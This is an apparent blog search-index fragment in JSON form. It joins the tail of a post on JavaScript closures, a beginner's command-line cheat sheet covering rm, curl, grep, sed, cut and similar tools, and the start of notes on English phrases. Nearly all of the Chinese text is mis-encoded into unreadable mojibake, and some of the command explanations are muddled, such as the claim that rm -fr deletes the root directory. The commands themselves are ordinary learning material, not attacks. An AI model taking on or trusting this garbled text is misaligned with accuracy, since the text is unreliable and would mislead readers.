é­”é¡å‘€ï½èª°æ˜¯å…¨å°ç£æœ€ç¾çš„å¥³äººå‘€ï½é­”é¡ï¼šå˜¿ï¼ŒsetTimeoutï¼Œå¹«æˆ‘åœ¨ä¸€ç§’å¾Œå« function å°å‡ºæœ€ç¾éº—çš„çš„å¥³äººçš„åå­—ï¼ˆprettiestGirlï¼‰å¥½å—ï¼ŸsetTimeout : å¥½å“¦ï¼Œæ²’å•é¡Œï¼---- ä¸€ç§’éå¾Œ ----functionï¼šæ˜¯è¨±ç´”ç¾ ã ãœ(Da-Ze)â˜…ï¼ ( function åœ¨å…¨åŸŸä½œç”¨åŸŸä¸‹æ‰¾åˆ° prettiestGirl )æ—å¿—ç²ï¼š... å…ˆåˆ¥æ€¥è‘—å¹«é­”é¡ä¸Šé¦™ï¼Œå¹¸å¥½é€™å€‹é§­å®¢ä¸¦ä¸çŸ¥é“æœ‰é–‰åŒ…çš„é€™æ¨£çš„ç‰¹æ€§å­˜åœ¨ï¼Œæ‰€ä»¥å…¶å¯¦é­”é¡é‚„æ˜¯æœƒå›ç­” æ—å¿—ç²ã€‚æœ€å¾Œä¸€å¤©åˆå¹³å®‰çš„éå»äº†ï¼Œæ„Ÿè¬é£›å¤©å°å¥³è­¦çš„åŠªåŠ›ï¼Œå¯å–œå¯è³€ï¼Œå¯å–œå¯è³€ã€‚ çµèªå¥½ä¹…æ²’æœ‰å¯«æ–‡ç« äº†ï¼Œè¦ºå¾—è‡ªå·±å¯«æ–‡ç« çš„åŠŸåŠ›é‚„å¾ˆéœï¼Œå¾ˆå¤šåœ°æ–¹ç¸½æœƒç…§è‘—åˆ¥äººçš„æƒ³æ³•ä¾†æ€è€ƒï¼Œæ²’æœ‰ç”¨è‡ªå·±çš„æ–¹å¼ä¾†ä½œè©®é‡‹ QQã€‚é›–ç„¶ä¹Ÿä¸æ˜¯èªªé€™æ¨£å­å°±ä¸å¥½ï¼Œç•¢ç«Ÿåœ¨å¯«é€™ç¯‡æ–‡ç« æ™‚ç¢ºå¯¦æœ‰è®“è‡ªå·±æ›´ç†è§£é€™äº›ç›¸é—œçŸ¥è­˜ã€‚ä½†æ˜¯æˆ‘è¦ºå¾—ï¼Œäººåœ¨å­¸ç¿’ä¸€ä»¶äº‹çš„æ™‚å€™ï¼Œæœ‰è‡ªå·±çš„æƒ³æ³•ä¹Ÿæ˜¯å¾ˆé‡è¦çš„ä¸€ä»¶äº‹æƒ…å§ï¼Ÿå°±åƒé‚£äº›æ–‡ç« å¯«å¾—å¾ˆå¥½çš„äººï¼Œä¹Ÿéƒ½æ˜¯ç”¨è‡ªå·±çš„æƒ³æ³•ä¾†è©®é‡‹ä¸€å€‹æ¦‚å¿µï¼Œé€™å€‹æ˜¯æˆ‘ä¹Ÿå¾ˆæƒ³å­¸ç¿’çš„ä¸€ä»¶äº‹æƒ…ã€‚ é›–ç„¶ç¾åœ¨çš„æˆ‘é‚„æ²’æœ‰æ‰¾åˆ°èƒ½å¤ åšåˆ°é€™ä»¶äº‹çš„æ–¹æ³•ï¼Œä½†æˆ‘æœƒæŒçºŒç·´ç¿’ä¸‹å»ï¼ŒæœŸæœ›è‡ªå·±æœ‰ä¸€å¤©ä¹Ÿèƒ½åšåˆ°ã€‚ æœ€å¾Œæ˜¯é¡Œå¤–è©±ï¼Œå¥½ä¸å®¹æ˜“æ±ºå®šå›ä¾†ç¶“ç‡Ÿéƒ¨è½æ ¼äº†ï¼Œå¸Œæœ›è‡ªå·±å¯ä»¥é¤Šæˆå¯«æ–‡ç« çš„ç¿’æ…£ï¼Œè®“è‡ªå·±çš„æ–‡ç« è¶Šä¾†è¶Šå¤šï¼Œé‚„æœ‰ä¸€æ­¥ä¸€æ­¥æå‡è‡ªå·±çš„å¯«ä½œèƒ½åŠ›ï¼ŒåŠ æ²¹ï¼ åƒè€ƒè³‡æ–™æ‰€æœ‰çš„å‡½å¼éƒ½æ˜¯é–‰åŒ…ï¼šè«‡ JS ä¸­çš„ä½œç”¨åŸŸèˆ‡ Closureé‡æ–°èªè­˜ JavaScript: Day 19 é–‰åŒ… Closure","link":"/2021/12/03/closure/"},{"title":"Commandline çš„æŒ‡ä»¤","text":"è¨˜å¾—æˆ‘ç¬¬ä¸€ç¯‡æ–‡ç« å°±æ˜¯å¯« Command-line æ€éº¼ç”¨ï¼Œé‚„çœŸæ‡·å¿µã€‚ä½†äººæœƒéš¨è‘—æ™‚é–“æ…¢æ…¢æˆé•·ï¼Œæ‰€ä»¥é€™æ¬¡è¦ä¾†æŠŠ Command-line çš„æŒ‡ä»¤ç´€éŒ„çš„æ›´åŠ å®Œæ•´ã€‚ ç°¡å–®ä»‹ç´¹ GUI èˆ‡ CLI æ˜¯ä»€éº¼åœ–å½¢åŒ–ä»‹é¢ GUIï¼ˆGraphic User Interfaceï¼‰ï¼Œæˆ‘å€‘æ—¥å¸¸åœ¨æ¡Œé¢ä¸Šçœ‹çš„åˆ°çš„é‚£äº›ç•«é¢ï¼Œåƒæ˜¯è³‡æ–™å¤¾ï¼Œæˆ‘çš„é›»è…¦ç­‰ç­‰ã€‚ä½ å¯ä»¥é€éé‚£å€‹ä»‹é¢ä¾†æ“ä½œçš„æ±è¥¿å°±æ˜¯ã€ŒGUIã€ã€‚ ä½†åœ¨æ—©æœŸæ²’æœ‰åœ–å½¢åŒ–ä»‹é¢ï¼Œæ‰€ä»¥éƒ½ç”¨ã€ŒCommand Line Interfaceã€ä¾†è·Ÿé›»è…¦åšæºé€šã€‚è€Œ CLI æ˜¯é€éã€Œç´”æ–‡å­—ã€ä¾†æ“ä½œé›»è…¦çš„æ–¹æ³•ã€‚å†æ¬¡å¼·èª¿ï¼Œä½ åªæœƒç”¨æ–‡å­—ä¾†æºé€šã€‚ CLI çš„æŒ‡ä»¤æé†’ï¼šé€™é‚Šçš„æŒ‡ä»¤å»ºè­°éƒ½ç”¨ Git bash ä¾†å¯¦ä½œæ¯”è¼ƒä¸æœƒå‡ºéŒ¯ è£œå……è§€å¿µï¼šæŒ‡ä»¤æ˜¯å¯ä»¥ä¸‹è¼‰çš„ï¼Œç•¢ç«ŸæŒ‡ä»¤å…¶å¯¦å°±æ˜¯åŸ·è¡Œä¸€æ®µç¨‹å¼ pwdï¼ˆPrint Working Directoryï¼‰ å°å‡ºæ‰€åœ¨ä½ç½® touch &lt;file&gt; ç¢°ä¸€ä¸‹ã€‚æ›´æ”¹æª”æ¡ˆçš„æœ€å¾Œä¿®æ”¹æ™‚é–“ã€‚å¦‚æœæª”æ¡ˆä¸å­˜åœ¨çš„è©±ï¼Œå»ºç«‹ä¸€å€‹æ–°çš„æª”æ¡ˆã€‚ manï¼ˆManualï¼‰ æŸ¥çœ‹ä½¿ç”¨èªªæ˜ mkdir &lt;directory&gt;ï¼ˆMake Directoryï¼‰ å»ºç«‹æ–°çš„è³‡æ–™å¤¾ rmdir &lt;directory&gt;ï¼ˆRemove directioryï¼‰ åˆªé™¤è³‡æ–™å¤¾ cat &lt;file1&gt; &lt;file2&gt;ï¼ˆConcatenationï¼‰ ç”¨ä¾†é€£æ¥æª”æ¡ˆã€‚ä½†å¦‚æœä½ åªæœ‰å¯«ä¸€å€‹æª”æ¡ˆï¼ˆä¸€å€‹åƒæ•¸ï¼‰ï¼Œæœƒç›´æ¥é¡¯ç¤ºå‡ºæª”æ¡ˆå…§å®¹ã€‚ wget &lt;url&gt; ä¸‹è¼‰æª”æ¡ˆã€‚ï¼ˆè¦é¡å¤–å®‰è£çš„æŒ‡ä»¤ï¼‰å¯ä»¥ç”¨ä¾†ä¸‹è¼‰æª”æ¡ˆï¼ŒåŒ…å«åœ–ç‰‡ã€åŸå§‹ç¢¼ç­‰ç­‰ã€‚ lsï¼ˆListï¼‰ å°å‡ºç›®å‰è³‡æ–™å¤¾åº•ä¸‹çš„æª”æ¡ˆ ls -l å°å‡ºæ›´è©³ç´°çš„å…§å®¹ ls -a ä¸å¿½ç•¥ã€Œ.ã€é–‹é ­çš„æª”æ¡ˆ cd &lt;directory&gt;ï¼ˆChange Directoryï¼‰ åˆ‡æ›åˆ°æŒ‡å®šçš„è³‡æ–™å¤¾ cd .. å›åˆ°ä¸Šä¸€å±¤è³‡æ–™å¤¾ cd ~ å›åˆ° user/userName çš„ä½ç½®ï¼ˆæ‡‰è©²æ˜¯æ ¹ç›®éŒ„å§ï¼‰ rm &lt;file&gt; ï¼ˆRemoveï¼‰åˆªé™¤æª”æ¡ˆ rm -f &lt;directory&gt;ï¼ˆforceï¼‰ å¼·åˆ¶åˆªé™¤æª”æ¡ˆ rm -r &lt;directory&gt; rm -R &lt;directory&gt;ï¼ˆrootï¼‰ / è³‡æ–™å¤¾è·Ÿåº•ä¸‹çš„æ±è¥¿å…¨éƒ¨åˆªé™¤ rm -fr &lt;directory&gt; å¼·åˆ¶åˆªé™¤æ ¹ç›®éŒ„è·Ÿæ‰€æœ‰æª”æ¡ˆï¼ˆå¦‚æœåªç”¨ rm -f çš„è©±ï¼Œ.git æª”æœƒè¢«ç•™ä¸‹ï¼‰ mv &lt;file&gt;ï¼ˆMoveï¼‰ç§»å‹•æª”æ¡ˆæˆ–æ˜¯æ”¹å mv æª”æ¡ˆ è¦ç§»å‹•åˆ°çš„è³‡æ–™å¤¾ mv æª”æ¡ˆ ..ï¼ˆç§»åˆ°ä¸Šä¸€å±¤è³‡æ–™å¤¾ï¼‰ mv æª”æ¡ˆ è¦æ›´æ”¹çš„æ–°åç¨± çµ•å°ä½ç½®èˆ‡ç›¸å°ä½ç½®çš„æ¦‚å¿µ çµ•å°ä½ç½®æ˜¯ä»¥ / ä½œç‚ºé–‹é ­çš„è·¯å¾‘ï¼ˆä»£è¡¨ /user/userNameï¼‰ç›¸å°ä½ç½®æ˜¯ä»¥ç›®å‰çš„æª”æ¡ˆä½ç½®ä½œç‚ºåƒè€ƒã€‚ ä¾‹å¦‚èªª test è³‡æ–™å¤¾ä¸­æœ‰å¦ä¸€å€‹ another è³‡æ–™å¤¾ã€‚å‡è¨­æˆ‘å€‘åœ¨ test è³‡æ–™å¤¾ï¼Œé‚£å°±å¯ä»¥ä¸‹ cd another é€™å€‹æŒ‡ä»¤ä¾†ç§»å‹•åˆ° another è³‡æ–™å¤¾ã€‚ cp &lt;file&gt;ï¼ˆCopyï¼‰è¤‡è£½æª”æ¡ˆ cp åŸæœ¬çš„æª”æ¡ˆ è¤‡è£½çš„æ–°æª”æ¡ˆåç¨± cp -f å¦‚æœæ˜¯è³‡æ–™å¤¾çš„è©±ï¼Œå¯ä»¥ç”¨ -f åƒæ•¸ä¾†å¼·åˆ¶åŸ·è¡Œã€‚ vim [&lt;file&gt;] ä¸€å€‹æ–‡å­—ç·¨è¼¯å™¨ã€‚å¯ä»¥é€é vi æˆ– vim æŒ‡ä»¤é€²å…¥ï¼š iï¼ˆInsertï¼‰ é€²å…¥æ’å…¥ï¼ˆç·¨è¼¯ï¼‰æ¨¡å¼ escï¼ˆEscapeï¼‰ é€²å…¥æ™®é€šæ¨¡å¼ï¼ˆå¯ä»¥è¤‡è£½ã€è²¼ä¸Šï¼Œä½†å°±æ˜¯ä¸èƒ½æ‰“å­—ï¼‰ p è²¼ä¸Š dd / D åˆªé™¤ä¸€è¡Œå…§å®¹ :%d åˆªé™¤æ‰€æœ‰å…§å®¹ :q é€€å‡ºï¼ˆquitï¼‰ :qa! ä¸ä¿å­˜æª”æ¡ˆé€€å‡º :wq å­˜æª”ä¸¦é€€å‡ºï¼ˆwrite and quitï¼‰ grep &lt;regexp&gt; &lt;file&gt; æŠ“å‡ºé—œéµå­—ã€‚è¼¸å…¥ä½ æƒ³è¦çš„é—œéµå­—ï¼ˆæ­£å‰‡è¡¨é”å¼ï¼‰ + æª”æ¡ˆåç¨±ã€‚å°±æœƒæŠŠåŒ…å«é‚£å€‹é—œéµå­—çš„é‚£ä¸€ã€Œæ•´è¡Œã€çš„æ–‡å­—å°å‡ºä¾†ã€‚ grep -E &lt;regexp&gt; &lt;file&gt; æœå°‹å¤šå€‹é—œéµå­—ï¼Œä¾‹å¦‚ â€œå­—ä¸² 1|å­—ä¸² 2|å­—ä¸² 3â€ grep -o &lt;regexp&gt; &lt;file&gt; åªå°å‡ºé—œéµå­—çš„éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯æ•´è¡Œå°å‡º curl &lt;url&gt; é€å‡º requestã€‚ curl -I åªé¡¯ç¤º HTTP çš„ç›¸é—œ headerï¼ˆä¸é¡¯ç¤º bodyï¼‰ curl -i é¡¯ç¤º HTTP çš„ç›¸é—œ header ï¼ˆå› ç‚ºé è¨­åªé¡¯ç¤º bodyï¼Œæ‰€ä»¥è¦æŠŠ header çµ¦ includeï¼‰ curl -X æŒ‡å®šè¦ç”¨ HTTP çš„å“ªå€‹æ–¹æ³•ä¾†æºé€šï¼ˆGETã€POSTã€DELETE ç­‰ç­‰ï¼‰ curl -d -F option çš„é …ç›®ï¼Œä»£è¡¨è¦ç”¨ POST å‚³éçš„è³‡æ–™ï¼ˆå…©ç¨® content-typeï¼‰ curl --silent åªé¡¯ç¤ºå›å‚³çš„å…§å®¹ï¼ˆä¸é¡¯ç¤ºè®€å–çš„é€²åº¦è³‡æ–™ï¼‰ è©¦è©¦çœ‹ï¼š 1curl https://jsonplaceholder.typicode.com/todos/1 ä½ å°±èƒ½å¾—åˆ° API çš„å›å‚³çµæœï¼ˆé€™æ‹›çœŸæ–¹ä¾¿ï¼ï¼‰ &gt; &lt;file&gt; ï¼ˆredirectionï¼‰æŠŠã€ŒæŒ‡ä»¤ã€çš„è¼¸å‡ºçµæœé‡æ–°å°å‘åˆ°ã€Œæª”æ¡ˆã€ã€‚ åŸæœ¬çš„è¼¸å‡ºæœƒç›´æ¥é¡¯ç¤ºåœ¨ terminal ä¸Šï¼Œä½†å¦‚æœç”¨ &gt; çš„è©±ï¼Œå°±æœƒæŠŠè¼¸å‡ºçµæœé‡æ–°å°å‘åˆ°ã€Œä½ æŒ‡å‘çš„æª”æ¡ˆã€ã€‚ 1echo '123' &gt; 123.txt å¦å¤–ï¼Œé‡æ–°å°å‘çš„å…§å®¹æœƒè¦†å¯«æ‰åŸæœ¬çš„å…§å®¹ 12echo '123' &gt; 123.txtecho '546' &gt; 123.txt æœ€å¾Œ 123.txt ä¸­çš„å…§å®¹æœƒæ˜¯ â€˜546â€™ï¼Œä¸æ˜¯ â€˜123546â€™ã€‚ å¦‚æœè¦ä¸å¸Œæœ›æ•´å€‹è¦†å¯«ï¼Œè€Œæ˜¯æ·»åŠ æ–°çš„å…§å®¹ï¼Œå¯ä»¥ç”¨ã€Œ&gt;&gt;ã€é€™å€‹æŒ‡ä»¤ï¼Œä¾†æŠŠå…§å®¹å¯«åˆ°æ–°çš„ä¸€è¡Œã€‚ &lt; &lt;file&gt; æŠŠã€Œæª”æ¡ˆã€çš„ input è¼¸å…¥åˆ°å·¦é‚Šçš„æŒ‡ä»¤ä¸­ã€‚ 123# code.txt =&gt; 'This is a dog'cat &lt; code.txt This is a dog é€™è£¡è¦åˆ†æ¸…æ¥š &gt; è·Ÿ &lt; çš„ç”¨æ³•ä¸å¤ªä¸€æ¨£ï¼Œ&gt; æ˜¯ç”¨ä¾†æŠŠè¼¸å‡ºå¯«åˆ°æŸå€‹æª”æ¡ˆï¼Œ&lt; æ˜¯ç”¨ä¾†æŠŠæª”æ¡ˆä¸Ÿçµ¦æŒ‡ä»¤åŸ·è¡Œã€‚ |ï¼ˆpipeï¼‰çµ„åˆè¨˜ã€‚æŠŠå·¦é‚ŠæŒ‡ä»¤çš„è¼¸å‡ºï¼Œè®Šæˆå³é‚ŠæŒ‡ä»¤çš„è¼¸å…¥ å‡è¨­æœ‰å€‹ hello.txt çš„å…§å®¹æ˜¯é€™æ¨£ï¼š 123hello worlda new lineanother new line å¦‚æœæˆ‘å€‘ç”¨ã€Œ|ã€ä¾†æŠŠ cat è·Ÿ grep åšçµ„åˆï¼Œå°±æœƒè®Šæˆé€™æ¨£ï¼š 1cat hello.txt | grep another æ­¤æ™‚çš„è¼¸å‡ºçµæœæœƒæ˜¯ã€Œanother new lineã€ã€‚ æµç¨‹æ˜¯é€™æ¨£å­ï¼š cat hello.txt æœƒè¼¸å‡ºæª”æ¡ˆä¸­çš„å…§å®¹ | ä»£è¡¨è¦æŠŠ 1 çš„è¼¸å‡ºå…§å®¹ç•¶ä½œå³é‚ŠæŒ‡ä»¤ grep another çš„è¼¸å…¥å…§å®¹ grep another å› ç‚ºæ²’æœ‰ç¬¬ä¸‰å€‹åƒæ•¸ï¼ˆæª”æ¡ˆåç¨±ï¼‰ï¼Œæ‰€ä»¥ä»–æœƒæª¢æŸ¥å‰é¢æ˜¯å¦æœ‰è¼¸å…¥çš„å…§å®¹ï¼ˆä¹Ÿå°±æ˜¯ã€Œ|ã€ï¼‰ã€‚ æ‰€ä»¥é€™ä¸€æ•´è¡Œçš„æ„æ€æ˜¯ã€ŒæŠŠ cat hello.txtã€çš„è¼¸å‡ºçµæœç•¶ä½œã€Œgrep anotherã€çš„è¼¸å…¥å…§å®¹ é™¤æ­¤ä¹‹å¤–ï¼Œä½ ä¹Ÿå¯ä»¥ç”¨å…¶ä»–æŒ‡ä»¤ä¾†åšå‡ºæ›´å¤šçš„çµ„åˆè¨˜ã€‚ä¾‹å¦‚èªªç¾åœ¨æƒ³è¦æŠŠ cat hello.text | grep another çš„è¼¸å‡ºçµæœå¯«åˆ°ä¸€å€‹æ–°çš„æª”æ¡ˆä¸­ï¼š 1cat hello.txt | grep another &gt; result æ­¤æ™‚å¦‚æœä½ å†ä½¿ç”¨ cat result ä¾†æŸ¥çœ‹æª”æ¡ˆå…§å®¹ï¼Œå°±æœƒå¾—åˆ°ã€Œanother new lineã€ã€‚ é€²éšæŒ‡ä»¤å–ä»£å­—ä¸² sed '/s&lt;regExp&gt;/&lt;replace-text&gt;/g' ï¼Œæœ‰é»é›£é–±è®€çš„è©±å°±æƒ³æˆé€™æ¨£ s/&lt;A&gt;/&lt;B&gt;/ï¼ŒAB ä»£è¡¨åƒæ•¸ã€‚ å¦å¤–è£œå……ä¸€ä¸‹ï¼Œsed åªæœƒæ”¹è¼¸å‡ºä¸æœƒæ”¹åŸå…§å®¹ã€‚ 12echo 'nice to meet you' | sed 's/nice/NICE/g' NICE to meet you è§£æ±ºé‡è¤‡é¸å–çš„å•é¡Œï¼Œä¾‹å¦‚èªª This is a book æœ‰å…©å€‹ isï¼Œå¦‚æœæ²’æœ‰åšè™•ç†çš„è©±æœƒè®Šé€™æ¨£ï¼š 12echo 'This is a book' | sed 's/is/IS/g'ThIS IS a book å¦‚æœåªæƒ³æ”¹ç¬¬äºŒå€‹ isï¼Œå¯ä»¥ç”¨æ­£è¦çš„ &lt;&gt; ä¾†åŒ…ä½å–®å­—ï¼ˆè¨˜å¾—åŠ ä¸Šè·³è„«å­—å…ƒï¼‰ï¼š 12echo 'This is a book' | sed 's/\\&lt;is\\&gt;/IS/g' This IS a book æ“·å–å­—å…ƒcut -c &lt;n-m&gt; &lt;file&gt; æŠ“å‡ºç¬¬ n å€‹å­—å…ƒåˆ°ç¬¬ m å€‹å­—å…ƒ 12echo 1234567890 | cut -c 1-512345 cut -c &lt;n-m&gt; &lt;file&gt; --complement æ’é™¤ç¬¬ n å€‹å­—å…ƒåˆ°ç¬¬ m å€‹å­—å…ƒ 12echo 1234567890 | cut -c 1-5 --complement67890 cut -d &lt;åˆ†éš”å­—å…ƒ&gt; -f &lt;è¦æ“·å–çš„æ¬„ä½&gt; &lt;file&gt; å‡è¨­æœ‰ä¸€å€‹æª”æ¡ˆå…§å®¹æ˜¯é•·é€™æ¨£ï¼š 123AA,BB,CC,DD,EE,FFGG,HH,II,JJ,KK,LLMM,NN,OO,PP,QQ,RR 1234cut -d , -f 1 code.txtAAGGMM æµç¨‹ï¼š ç¬¬ä¸€è¡Œæœƒåˆ†éš”ç‚ºï¼Œæ¬„ä½ä¸€ï¼šAAï¼Œæ¬„ä½äºŒï¼šBBï¼Œæ¬„ä½ä¸‰ï¼šCC â€¦ -f èªªè¦æ“·å–çš„æ¬„ä½æ˜¯ 1ï¼Œæ‰€ä»¥è¼¸å‡º AA æ›ä¸‹ä¸€è¡Œï¼Œé‡è¤‡ä¸Šé¢å‹•ä½œï¼Œç›´åˆ°æœ€å¾Œä¸€è¡Œã€‚ å¦‚æœè¦å¤šå€‹æ¬„ä½å¯ä»¥å¯«æˆ -f &lt;é€£çºŒæ¬„ä½&gt;, &lt;å–®å€‹æ¬„ä½&gt;ï¼š 1234cut -d , -f 1-3,6 code.txtAA,BB,CC,FFGG,HH,II,LLMM,NN,OO,RR å°±æ˜¯å–å‡ºæ¯è¡Œçš„ 1-3 æ¬„è·Ÿ 6 æ¬„ã€‚ å…¶ä»–æŒ‡ä»¤ whoami æˆ‘æ˜¯èª°ï¼Œæœƒé¡¯ç¤ºç›®å‰é›»è…¦çš„ä½¿ç”¨è€…åç¨± less &lt;file-name&gt; ç”¨åˆ†é ä¾†æŸ¥çœ‹æª”æ¡ˆå…§å®¹ï¼Œå¯ä»¥ç”¨ â†‘ â†“ ä¾† å¾€ä¸Šæˆ–å¾€ä¸‹æ»¾ï¼›â† â†’ ä¾†åˆ‡æ›é é¢ï¼Œq æ˜¯é€€å‡ºï¼Œh æ˜¯çœ‹å¹«åŠ©ã€‚ explorer é–‹å•Ÿæª”æ¡ˆç¸½ç®¡ history æª¢è¦–æ‰€æœ‰æŒ‡ä»¤ç´€éŒ„ ipconfig æŸ¥è©¢ä¸»æ©Ÿçš„ IP è¨­å®šèˆ‡åœ°å€ ping &lt;ip-address&gt; é€£åˆ°æŸå€‹ä¸»æ©Ÿï¼ˆæˆ–åŸŸåï¼‰ï¼Œçœ‹çœ‹æŸå€‹ä¸»æ©Ÿæ˜¯é–‹è‘—é‚„æ˜¯é—œè‘—çš„ uname Unix Name çš„ç¸®å¯«ï¼Œåˆ—å‡ºä¸»æ©Ÿçš„ä½œæ¥­ç³»çµ±åç¨± hostname æŸ¥çœ‹ä¸»æ©Ÿåç¨± netstat æŸ¥è©¢ç¶²è·¯ç›®å‰çš„ç‹€æ³ nslookup [&lt;domain-name&gt;] [id-address] ç”¨ domain name ä¾†æŸ¥ IP åœ°å€ï¼Œä¹Ÿå¯åéä¾† telnet é€£åˆ°æŒ‡å®šçš„é€£æ¥åŸ ï¼ˆportï¼‰ date é¡¯ç¤ºæ™‚é–“ tree æŸ¥çœ‹è³‡æ–™çµæ§‹çš„æ¨¹ç‹€åœ–ï¼Œè¦é¡¯ç¤ºæª”æ¡ˆå¯åŠ ä¸Š /f base64 æŠŠå·¦é‚Šçš„ input æˆ–å³é‚Šçš„ output ç”¨ base64 ä¾†ç·¨ç¢¼ï¼ˆæ­é… | æˆ– &lt; ä½¿ç”¨ï¼‰ï¼Œè¦è§£ç¢¼å¯ä»¥åŠ ä¸Š -d tasklist é¡ä¼¼å·¥ä½œç®¡ç†å“¡ï¼Œå¯ä»¥æŸ¥çœ‹ç›®å‰åŸ·è¡Œçš„ç¨‹å¼ taskkill é—œæ‰ç¨‹å¼ã€‚//im æŒ‡å®šæª”æ¡ˆåç¨±ï¼Œ//PID æŒ‡å®š ID æƒ³å­¸æ›´å¤šå¯ä»¥åƒè€ƒçš„æ–‡ç«  å­¸ sed Linux æŒ‡ä»¤ SED ç”¨æ³•æ•™å­¸ã€å–ä»£ç¯„ä¾‹ã€è©³è§£ åƒè€ƒè³‡æ–™linux ç”¨ grep æŸ¥è©¢å–®å€‹æˆ–å¤šå€‹å­—ä¸²ï¼ˆé—œéµå­—ï¼‰ç”¨ grep æ­é…æ­£è¦è¡¨ç¤ºå¼æ“·å–å­—ä¸²Redirecting Input and Output","link":"/2021/12/14/commandline-instruction/"},{"title":"æ—¥å¸¸è‹±æ–‡ç”¨èª","text":"é€™è£¡åŸºæœ¬ä¸Šåªæ˜¯éš¨æ‰‹ç´€éŒ„ï¼Œå› ç‚ºæœ€è¿‘é–‹å§‹æƒ³ç·´ç¿’å¯«è‹±æ–‡çš„æŠ€å·§ï¼Œæ‰€ä»¥æœƒæŠŠä¸€äº›è©å½™æˆ–ç”¨èªéƒ½æ”¾åœ¨é€™è£¡ç•¶ä½œç­†è¨˜ã€‚ å°è¦½è¡¨é”æ„è¦‹ æˆ‘æƒ³â€¦ æˆ‘ä¼°è¨ˆâ€¦ æˆ‘èªç‚ºâ€¦ å°æˆ‘è€Œè¨€â€¦ åœ¨æˆ‘çš„è§’åº¦ä¾†çœ‹â€¦ ä»¥æˆ‘å€‹äººè€Œè¨€â€¦ ä»¥æˆ‘å€‹äººçš„ç¶“é©—ä¾†çœ‹â€¦ æ“šæˆ‘æ‰€çŸ¥â€¦ å…¶ä»– ç•¢ç«Ÿ åéä¾†èªª è®“æˆ‘å€‘è©¦è©¦çœ‹ æ¯”è¼ƒå®¹æ˜“ ç°¡å–®ä¾†èªª æŠŠ A è¦–ç‚º B å°å¿ƒè¬¹æ… ä¸ä¹…ä¹‹å‰ ç‰¹åœ° çœ‹ä¾† æ—¢ä½¿ æ ¹æ“š é€™èªªå¾—éå» æŒºæœ‰é“ç†çš„ æ¯«ç„¡ç–‘å• ä½ èªªçš„æœ‰é»é“ç† æˆ‘å¾ˆæ„Ÿæ¿€é‚£ä»¶äº‹ è¬è¬ä½ é»å‡ºå•é¡Œ è®“æˆ‘æ¶ˆåŒ–ä¸€ä¸‹é€™ä»¶äº‹ æˆ‘æƒ³â€¦I guess this is the only option we can choose.æˆ‘æƒ³é€™æ˜¯æˆ‘å€‘å”¯ä¸€èƒ½å¤ é¸çš„é¸é …ã€‚ æˆ‘ä¼°è¨ˆâ€¦I supose our revenue will double after lauching this event.æˆ‘ä¼°è¨ˆåœ¨èˆ‰è¾¦é€™å€‹æ´»å‹•å¾Œï¼Œæˆ‘å€‘çš„æ”¶å…¥å°‡æœƒç¿»å€ã€‚ æˆ‘èªç‚ºâ€¦ In my opinion, ...In my opinion, increasing punishment cannot relieve the problem. æˆ‘èªç‚ºåŠ é‡ç½°æ¬¾ä¸¦ä¸èƒ½æ¸›è¼•å•é¡Œã€‚ As I see it, ...As I see it, we should prioritize this task, otherwise, we may not finish it by deadline.æˆ‘èªç‚ºæˆ‘å€‘æ‡‰è©²å„ªå…ˆè™•ç†é€™é …å·¥ä½œï¼Œå¦å‰‡ï¼Œæˆ‘å€‘å¯èƒ½ç„¡æ³•åœ¨æœŸé™ä¹‹å‰å®Œæˆã€‚ å°æˆ‘è€Œè¨€â€¦It seems to me that your idea may be too fancy.å°æˆ‘è€Œè¨€ï¼Œä½ çš„æƒ³æ³•æœ‰é»ä¸å¤ªå¯¦éš›ã€‚ åœ¨æˆ‘çš„è§’åº¦ä¾†çœ‹â€¦From my perspective, family is the most precious asset in our life.åœ¨æˆ‘çš„è§’åº¦ä¾†çœ‹ï¼Œå®¶åº­æ˜¯æˆ‘å€‘äººç”Ÿä¸­æœ€å¯¶è²´çš„è²¡ç”¢ã€‚ ä»¥æˆ‘å€‹äººè€Œè¨€â€¦Personally, I would rather donate money to animal society.ä»¥æˆ‘å€‹äººè€Œè¨€ï¼Œæˆ‘å¯§å¯æéŒ¢çµ¦å‹•ç‰©æ©Ÿæ§‹ã€‚ ä»¥æˆ‘å€‹äººçš„ç¶“é©—ä¾†çœ‹â€¦From my own experience, watching UK drama is the best way to learn British accent.ä»¥æˆ‘å€‹äººçš„ç¶“é©—ä¾†çœ‹ï¼Œçœ‹è‹±åŠ‡æ˜¯å­¸ç¿’è‹±åœ‹å£è‹±çš„æœ€ä½³æ–¹å¼ã€‚ æ“šæˆ‘æ‰€çŸ¥â€¦In my knowledge, there is no law protecting stray animals now.æ“šæˆ‘æ‰€çŸ¥ï¼Œç›®å‰æ²’æœ‰æ³•å¾‹ä¿è­·æµæµªå‹•ç‰©ã€‚ ç•¢ç«ŸAfter all, there are no subtitles in real conversations.ç•¢ç«Ÿï¼Œåœ¨å¯¦éš›äº¤è«‡ä¸­å¯æ˜¯æ²’æœ‰å­—å¹•çš„ã€‚ åéä¾†èªªA husband shoud never cheat on his wife, Conversely, a wife should never have an extra-marital affair. è®“æˆ‘å€‘è©¦è©¦çœ‹Let's try another approach to the matter.é‡å°é€™ä»¶äº‹æƒ…ï¼Œè®“æˆ‘å€‘ç”¨åˆ¥çš„æ–¹æ³•ä¾†è©¦è©¦çœ‹ã€‚ æ¯”è¼ƒå®¹æ˜“ Easierï¼ˆA æ¯” B å®¹æ˜“ï¼‰French is easier than German.æ³•æ–‡æ¯”å¾·æ–‡å®¹æ˜“ã€‚ More easily ï¼ˆæŸå€‹å‹•ä½œåšèµ·ä¾†æ¯”è¼ƒå®¹æ˜“ï¼‰You can pay your bill more easily using the internet.ä½ å¯ä»¥é€éç¶²è·¯ä¾†ç¹³ä½ çš„å¸³å–®ï¼Œé€™æ¨£æœƒæ¯”è¼ƒå®¹æ˜“ã€‚ ç°¡å–®ä¾†èªª In brief, ...In brief, my teammate is a slacker.ç°¡å–®ä¾†èªªï¼Œæˆ‘çš„éšŠå‹å°±æ˜¯å€‹é›·åŒ…ã€‚ In short, ...In short, we need to hire at least three new people.ç°¡è€Œè¨€ä¹‹ï¼Œæˆ‘å€‘è‡³å°‘é‚„å¾—é›‡ç”¨ä¸‰å€‹æ–°äººã€‚ æŠŠ A è¦–ç‚º B see + A as BHe sees Taiwan as a perfect vacation spot.ä»–æŠŠå°ç£è¦–ç‚ºæ˜¯ä¸€å€‹å®Œç¾çš„æ¸¡å‡å‹åœ°ã€‚ regard + A as BHe regard computer as his life.ä»–æŠŠé›»è…¦ç•¶ä½œæ˜¯ä»–çš„ç”Ÿå‘½ã€‚ consider + A (to be) BI consider you (to be) my friend.æˆ‘æŠŠä½ 